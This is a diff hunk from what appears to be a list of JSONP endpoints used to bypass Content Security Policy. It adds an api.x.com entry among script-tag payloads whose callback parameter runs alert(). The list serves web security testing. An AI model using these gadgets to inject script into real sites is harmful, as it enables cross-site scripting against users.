@@ -146,6 +146,7 @@ api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=
 api.unit-online.ru	<script src="http://api.unit-online.ru/rating?callback=alert%281%29&type=pvp&count=10&_=1728503296638"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
+api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
 api.yumake.jp	<script src="https://api.yumake.jp/1.0/sun.php?lat=26.264167&lon=127.700109&date=20241010&key=4f1452df57c1f2e21bb562c1469e78da&format=jsonp&callback=alert&_=1728573144432"></script>
 api-zeta.minet.jp	<script src="https://api-zeta.minet.jp/api/v1/trend?domain=www.wavesjapan.jp&limit=5&callback=alert&_=1728597156887"></script>
 ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>
